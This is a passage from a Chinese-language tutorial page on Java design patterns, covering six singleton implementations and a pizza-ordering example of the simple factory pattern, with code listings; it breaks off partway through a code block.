没有接口，不能继承，与单一职责原则冲突，一个类应该只关心内部逻辑，而不关心外面怎么样来实例化。</p><p><strong>使用场景：</strong></p><ul><li>1、要求生产唯一序列号。</li><li>2、WEB 中的计数器，不用每次刷新都在数据库里加一次，用单例先缓存起来。</li><li>3、创建的一个对象需要消耗的资源过多，比如 I/O 与数据库的连接等。</li></ul><p><strong>注意事项：</strong> getInstance() 方法中需要使用同步锁 synchronized (Singleton.class) 防止多线程同时进入造成<br />instance 被多次实例化。</p><h2 id="实现"><a class="markdownIt-Anchor" href="#实现"></a> 实现</h2><p>我们将创建一个 <em>SingleObject</em> 类。 <em>SingleObject</em> 类有它的私有构造函数和本身的一个静态实例。</p><p><em>SingleObject</em> 类提供了一个静态方法，供外界获取它的静态实例。 <em>SingletonPatternDemo</em> 类使用<br /><em>SingleObject</em> 类来获取 <em>SingleObject</em> 对象。</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/62576915-36E0-4B67-B078-704699CA980A.jpg" alt="单例模式的 UML 图" /></p><h3 id="步骤-1"><a class="markdownIt-Anchor" href="#步骤-1"></a> 步骤 1</h3><p>创建一个 Singleton 类。</p><p>SingleObject.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SingleObject</span> &#123;<br> <br>   <span class="hljs-comment">//创建 SingleObject 的一个对象</span><br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">SingleObject</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SingleObject</span>();<br> <br>   <span class="hljs-comment">//让构造函数为 private，这样该类就不会被实例化</span><br>   <span class="hljs-keyword">private</span> <span class="hljs-title function_">SingleObject</span><span class="hljs-params">()</span>&#123;&#125;<br> <br>   <span class="hljs-comment">//获取唯一可用的对象</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SingleObject <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span>&#123;<br>      <span class="hljs-keyword">return</span> instance;<br>   &#125;<br> <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">showMessage</span><span class="hljs-params">()</span>&#123;<br>      System.out.println(<span class="hljs-string">&quot;Hello World!&quot;</span>);<br>   &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="步骤-2"><a class="markdownIt-Anchor" href="#步骤-2"></a> 步骤 2</h3><p>从 singleton 类获取唯一的对象。</p><p>SingletonPatternDemo.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SingletonPatternDemo</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br> <br>      <span class="hljs-comment">//不合法的构造函数</span><br>      <span class="hljs-comment">//编译时错误：构造函数 SingleObject() 是不可见的</span><br>      <span class="hljs-comment">//SingleObject object = new SingleObject();</span><br> <br>      <span class="hljs-comment">//获取唯一可用的对象</span><br>      <span class="hljs-type">SingleObject</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> SingleObject.getInstance();<br> <br>      <span class="hljs-comment">//显示消息</span><br>      object.showMessage();<br>   &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="步骤-3"><a class="markdownIt-Anchor" href="#步骤-3"></a> 步骤 3</h3><p>执行程序，输出结果：</p><p>​</p><pre><code class="hljs">Hello World!</code></pre><p>​</p><h2 id="单例模式的几种实现方式"><a class="markdownIt-Anchor" href="#单例模式的几种实现方式"></a> 单例模式的几种实现方式</h2><p>单例模式的实现有多种方式，如下所示：</p><h3 id="1-懒汉式线程不安全"><a class="markdownIt-Anchor" href="#1-懒汉式线程不安全"></a> 1、懒汉式，线程不安全</h3><p><strong>是否 Lazy 初始化：</strong> 是</p><p><strong>是否多线程安全：</strong> 否</p><p><strong>实现难度：</strong> 易</p><p><strong>描述：</strong> 这种方式是最基本的实现方式，这种实现最大的问题就是不支持多线程。因为没有加锁 synchronized，所以严格意义上它并不算单例模式。<br />这种方式 lazy loading 很明显，不要求线程安全，在多线程不能正常工作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Singleton instance;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span> <span class="hljs-params">()</span>&#123;&#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;  <br>            instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();  <br>        &#125;  <br>        <span class="hljs-keyword">return</span> instance;  <br>    &#125;  <br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>接下来介绍的几种实现方式都支持多线程，但是在性能上有所差异。</strong></p><h3 id="2-懒汉式线程安全"><a class="markdownIt-Anchor" href="#2-懒汉式线程安全"></a> 2、懒汉式，线程安全</h3><p><strong>是否 Lazy 初始化：</strong> 是</p><p><strong>是否多线程安全：</strong> 是</p><p><strong>实现难度：</strong> 易</p><p><strong>描述：</strong> 这种方式具备很好的 lazy loading，能够在多线程中很好的工作，但是，效率很低，99% 情况下不需要同步。<br />优点：第一次调用才初始化，避免内存浪费。<br />缺点：必须加锁 synchronized 才能保证单例，但加锁会影响效率。<br />getInstance() 的性能对应用程序不是很关键（该方法使用不太频繁）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Singleton instance;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span> <span class="hljs-params">()</span>&#123;&#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) &#123;  <br>            instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();  <br>        &#125;  <br>        <span class="hljs-keyword">return</span> instance;  <br>    &#125;  <br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="3-饿汉式"><a class="markdownIt-Anchor" href="#3-饿汉式"></a> 3、饿汉式</h3><p><strong>是否 Lazy 初始化：</strong> 否</p><p><strong>是否多线程安全：</strong> 是</p><p><strong>实现难度：</strong> 易</p><p><strong>描述：</strong> 这种方式比较常用，但容易产生垃圾对象。<br />优点：没有加锁，执行效率会提高。<br />缺点：类加载时就初始化，浪费内存。<br />它基于 classloader 机制避免了多线程的同步问题，不过，instance<br />在类装载时就实例化，虽然导致类装载的原因有很多种，在单例模式中大多数都是调用 getInstance 方法，但是也不能确定有其他的方式（或者其他的静态方法）导致类装载，这时候初始化 instance 显然没有达到 lazy loading 的效果。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Singleton</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();  <br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span> <span class="hljs-params">()</span>&#123;&#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;  <br>    <span class="hljs-keyword">return</span> instance;  <br>    &#125;  <br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="4-双检锁双重校验锁dcl即-double-checked-locking"><a class="markdownIt-Anchor" href="#4-双检锁双重校验锁dcl即-double-checked-locking"></a> 4、双检锁/双重校验锁（DCL，即 double-checked locking）</h3><p><strong>JDK 版本：</strong> JDK1.5 起</p><p><strong>是否 Lazy 初始化：</strong> 是</p><p><strong>是否多线程安全：</strong> 是</p><p><strong>实现难度：</strong> 较复杂</p><p><strong>描述：</strong> 这种方式采用双锁机制，安全且在多线程情况下能保持高性能。<br />getInstance() 的性能对应用程序很关键。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-keyword">static</span> Singleton singleton;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span> <span class="hljs-params">()</span>&#123;&#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getSingleton</span><span class="hljs-params">()</span> &#123;  <br>    <span class="hljs-keyword">if</span> (singleton == <span class="hljs-literal">null</span>) &#123;  <br>        <span class="hljs-keyword">synchronized</span> (Singleton.class) &#123;  <br>            <span class="hljs-keyword">if</span> (singleton == <span class="hljs-literal">null</span>) &#123;  <br>                singleton = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();  <br>            &#125;  <br>        &#125;  <br>    &#125;  <br>    <span class="hljs-keyword">return</span> singleton;  <br>    &#125;  <br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="5-登记式静态内部类"><a class="markdownIt-Anchor" href="#5-登记式静态内部类"></a> 5、登记式/静态内部类</h3><p><strong>是否 Lazy 初始化：</strong> 是</p><p><strong>是否多线程安全：</strong> 是</p><p><strong>实现难度：</strong> 一般</p><p><strong>描述：</strong><br />这种方式能达到双检锁方式一样的功效，但实现更简单。对静态域使用延迟初始化，应使用这种方式而不是双检锁方式。这种方式只适用于静态域的情况，双检锁方式可在实例域需要延迟初始化时使用。<br />这种方式同样利用了 classloader 机制来保证初始化 instance 时只有一个线程，它跟第 3 种方式不同的是：第 3 种方式只要Singleton 类被装载了，那么 instance 就会被实例化（没有达到 lazy loading 效果），而这种方式是 Singleton类被装载了，instance 不一定被初始化。因为 SingletonHolder 类没有被主动使用，只有通过显式调用 getInstance方法时，才会显式装载 SingletonHolder 类，从而实例化 instance。想象一下，如果实例化 instance很消耗资源，所以想让它延迟加载，另外一方面，又不希望在 Singleton 类加载时就实例化，因为不能确保 Singleton类还可能在其他的地方被主动使用从而被加载，那么这个时候实例化 instance 显然是不合适的。这个时候，这种方式相比第 3 种方式就显得很合理。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SingletonHolder</span> &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Singleton</span> <span class="hljs-variable">INSTANCE</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();  <br>    &#125;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span> <span class="hljs-params">()</span>&#123;&#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> SingletonHolder.INSTANCE;  <br>    &#125;  <br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="6-枚举"><a class="markdownIt-Anchor" href="#6-枚举"></a> 6、枚举</h3><p><strong>JDK 版本：</strong> JDK1.5 起</p><p><strong>是否 Lazy 初始化：</strong> 否</p><p><strong>是否多线程安全：</strong> 是</p><p><strong>实现难度：</strong> 易</p><p><strong>描述：</strong> 这种实现方式还没有被广泛采用，但这是实现单例模式的最佳方法。它更简洁，自动支持序列化机制，绝对防止多次实例化。<br />这种方式是 Effective Java 作者 Josh Bloch提倡的方式，它不仅能避免多线程同步问题，而且还自动支持序列化机制，防止反序列化重新创建新的对象，绝对防止多次实例化。不过，由于 JDK1.5 之后才加入enum 特性，用这种方式写不免让人感觉生疏，在实际工作中，也很少用。<br />不能通过 reflection attack 来调用私有构造方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">Singleton</span> &#123;  <br>    INSTANCE;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">whateverMethod</span><span class="hljs-params">()</span> &#123;  <br>    &#125;  <br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>经验之谈：</strong> 一般情况下，不建议使用第 1 种和第 2 种懒汉方式，建议使用第 3 种饿汉方式。只有在要明确实现 lazy loading效果时，才会使用第 5 种登记方式。如果涉及到反序列化创建对象时，可以尝试使用第 6 种枚举方式。如果有其他特殊的需求，可以考虑使用第 4 种双检锁方式。</p><h1 id="工厂模式"><a class="markdownIt-Anchor" href="#工厂模式"></a> <mark>工厂模式</mark></h1><p>工厂模式（Factory Pattern）是 Java 中最常用的设计模式之一。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。</p><p>在工厂模式中，我们在创建对象时不会对客户端暴露创建逻辑，并且是通过使用一个共同的接口来指向新创建的对象。</p><h2 id="介绍-2"><a class="markdownIt-Anchor" href="#介绍-2"></a> 介绍</h2><p><strong>意图：</strong> 定义一个创建对象的接口，让其子类自己决定实例化哪一个工厂类，工厂模式使其创建过程延迟到子类进行。</p><p><strong>主要解决：</strong> 主要解决接口选择的问题。</p><p><strong>何时使用：</strong> 我们明确地计划不同条件下创建不同实例时。</p><p><strong>如何解决：</strong> 让其子类实现工厂接口，返回的也是一个抽象的产品。</p><p><strong>关键代码：</strong> 创建过程在其子类执行。</p><p><strong>应用实例：</strong> 1、您需要一辆汽车，可以直接从工厂里面提货，而不用去管这辆汽车是怎么做出来的，以及这个汽车里面的具体实现。 2、Hibernate换数据库只需换方言和驱动就可以。</p><p><strong>优点：</strong> 1、一个调用者想创建一个对象，只要知道其名称就可以了。 2、扩展性高，如果想增加一个产品，只要扩展一个工厂类就可以。<br />3、屏蔽产品的具体实现，调用者只关心产品的接口。</p><p><strong>缺点：</strong><br />每次增加一个产品时，都需要增加一个具体类和对象实现工厂，使得系统中类的个数成倍增加，在一定程度上增加了系统的复杂度，同时也增加了系统具体类的依赖。这并不是什么好事。</p><p><strong>使用场景：</strong></p><p>1、日志记录器：记录可能记录到本地硬盘、系统事件、远程服务器等，用户可以选择记录日志到什么地方。<br />2、数据库访问，当用户不知道最后系统采用哪一类数据库，以及数据库可能有变化时。<br />3、设计一个连接服务器的框架，需要三个协议，“POP3”、“IMAP”、“HTTP”，可以把这三个作为产品类，共同实现一个接口。</p><p><strong>注意事项：</strong><br />作为一种创建类模式，在任何需要生成复杂对象的地方，都可以使用工厂方法模式。有一点需要注意的地方就是复杂对象适合使用工厂模式，而简单对象，特别是只需要通过new 就可以完成创建的对象，无需使用工厂模式。如果使用工厂模式，就需要引入一个工厂类，会增加系统的复杂度。</p><h2 id="实现四种方式"><a class="markdownIt-Anchor" href="#实现四种方式"></a> 实现四种方式</h2><p>​    看一个披萨的项目：要便于披萨种类的扩展，要便于维护</p><ol><li>披萨的种类很多(比如 GreekPizz、CheesePizz 等)</li><li>披萨的制作有 prepare，bake, cut, box</li><li>完成披萨店订购功能。</li></ol><h3 id="使用传统的方式来完成"><a class="markdownIt-Anchor" href="#使用传统的方式来完成"></a> 使用传统的方式来完成</h3><ol><li>思路分析(类图)</li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221224163121334.png" alt="image-20221224163121334" /></p><p>编写 OrderPizza.java 去订购需要的各种 Pizza</p><p>代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderPizza</span> &#123;<br>    <span class="hljs-comment">// 构造器</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">OrderPizza</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">Pizza</span> <span class="hljs-variable">pizza</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>String orderType; <span class="hljs-comment">// 订购披萨的类型</span><br><span class="hljs-keyword">do</span> &#123;<br>orderType = getType();<br><span class="hljs-keyword">if</span> (orderType.equals(<span class="hljs-string">&quot;greek&quot;</span>)) &#123;<br>pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">GreekPizza</span>();<br>pizza.setName(<span class="hljs-string">&quot; 希腊披萨 &quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (orderType.equals(<span class="hljs-string">&quot;cheese&quot;</span>)) &#123;<br>pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CheesePizza</span>();<br>pizza.setName(<span class="hljs-string">&quot; 奶酪披萨 &quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (orderType.equals(<span class="hljs-string">&quot;pepper&quot;</span>)) &#123;<br>pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PepperPizza</span>();<br>pizza.setName(<span class="hljs-string">&quot;胡椒披萨&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">//输出pizza 制作过程</span><br>pizza.prepare();<br>pizza.bake();<br>pizza.cut();<br>pizza.box();<br><br>&#125; <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>);<br>&#125;<br>    <span class="hljs-comment">// 写一个方法，可以获取客户希望订购的披萨种类</span><br><span class="hljs-keyword">private</span> String <span class="hljs-title function_">getType</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-type">BufferedReader</span> <span class="hljs-variable">strin</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(System.in));<br>System.out.println(<span class="hljs-string">&quot;input pizza 种类:&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> strin.readLine();<br><span class="hljs-keyword">return</span> str;<br>&#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>e.printStackTrace();<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>&#125;<br>&#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><ol><li><p>优点是比较好理解，简单易操作。</p></li><li><p>缺点是违反了设计模式的 <strong>ocp 原则</strong>，即对扩展开放，对修改关闭。即当我们给类增加新功能的时候，尽量不修改代码，或者尽可能少修改代码.</p></li><li><p>比如我们这时<strong>要新增加一个 Pizza 的种类(Pepper 披萨)</strong>，我们需要做如下修改.</p></li></ol><p>如果我们增加一个 Pizza 类，只要是订购 Pizza 的代码都需要修改.</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221224163539743.png" alt="image-20221224163539743" /></p><ol start="4"><li>改进的思路分析</li></ol><p>分析：修改代码可以接受，但是如果我们在其它的地方也有创建 Pizza 的代码，就意味着，也需要修改，而创建 Pizza的代码，往往有多处。</p><p>思路：<strong>把创建 Pizza 对象封装到一个类中，这样我们有新的 Pizza 种类时，只需要修改该类就可</strong>，其它有创建到 Pizza对象的代码就不需要修改了.-&gt; <strong>简单工厂</strong>模式</p><h3 id="使用简单工厂模式"><a class="markdownIt-Anchor" href="#使用简单工厂模式"></a> 使用简单工厂模式</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221224163606286.png" alt="image-20221224163606286" /></p><p><strong>代码</strong></p><p><code>SimpleFactory</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">package</span> io.xtwoy.factory.simplefactory.pizzastore.order;<br><br><span class="hljs-keyword">import</span> io.xtwoy.factory.simplefactory.pizzastore.pizza.CheesePizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.simplefactory.pizzastore.pizza.GreekPizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.simplefactory.pizzastore.pizza.PepperPizza;<br><span class="hljs-keyword">import</span> io.xtwoy.factory.simplefactory.pizzastore.pizza.Pizza;<br><br><span class="hljs-comment">//简单工厂类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleFactory</span> &#123;<br><br>   <span class="hljs-comment">//更加orderType 返回对应的Pizza 对象</span><br>   <span class="hljs-keyword">public</span> Pizza <span class="hljs-title function_">createPizza</span><span class="hljs-params">(String orderType)</span> &#123;<br><br>      <span class="hljs-type">Pizza</span> <span class="hljs-variable">pizza</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>      System.out.println(<span class="hljs-string">&quot;使用简单工厂模式&quot;</span>);<br>      <span class="hljs-keyword">if</span> (orderType.equals(<span class="hljs-string">&quot;greek&quot;</span>)) &#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">GreekPizza</span>();<br>         pizza.setName(<span class="hljs-string">&quot; 希腊披萨 &quot;</span>);<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (orderType.equals(<span class="hljs-string">&quot;cheese&quot;</span>)) &#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CheesePizza</span>();<br>         pizza.setName(<span class="hljs-string">&quot; 奶酪披萨 &quot;</span>);<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (orderType.equals(<span class="hljs-string">&quot;pepper&quot;</span>)) &#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PepperPizza</span>();<br>         pizza.setName(<span class="hljs-string">&quot;胡椒披萨&quot;</span>);<br>      &#125;<br>      <br>      <span class="hljs-keyword">return</span> pizza;<br>   &#125;<br>   <br>   <span class="hljs-comment">//简单工厂模式 也叫 静态工厂模式 </span><br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Pizza <span class="hljs-title function_">createPizza2</span><span class="hljs-params">(String orderType)</span> &#123;<br>      <span class="hljs-type">Pizza</span> <span class="hljs-variable">pizza</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>      System.out.println(<span class="hljs-string">&quot;使用简单工厂模式2&quot;</span>);<br>      <span class="hljs-keyword">if</span> (orderType.equals(<span class="hljs-string">&quot;greek&quot;</span>)) &#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">GreekPizza</span>();<br>         pizza.setName(<span class="hljs-string">&quot; 希腊披萨 &quot;</span>);<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (orderType.equals(<span class="hljs-string">&quot;cheese&quot;</span>)) &#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CheesePizza</span>();<br>         pizza.setName(<span class="hljs-string">&quot; 奶酪披萨 &quot;</span>);<br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (orderType.equals(<span class="hljs-string">&quot;pepper&quot;</span>)) &#123;<br>         pizza = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PepperPizza</span>();<br>         pizza.setName(<span class="hljs-string">&quot;胡椒披萨&quot;</span>);<br>      &#125;<br>      <span class="hljs-keyword">return</span> pizza;<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>OrderPizza</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 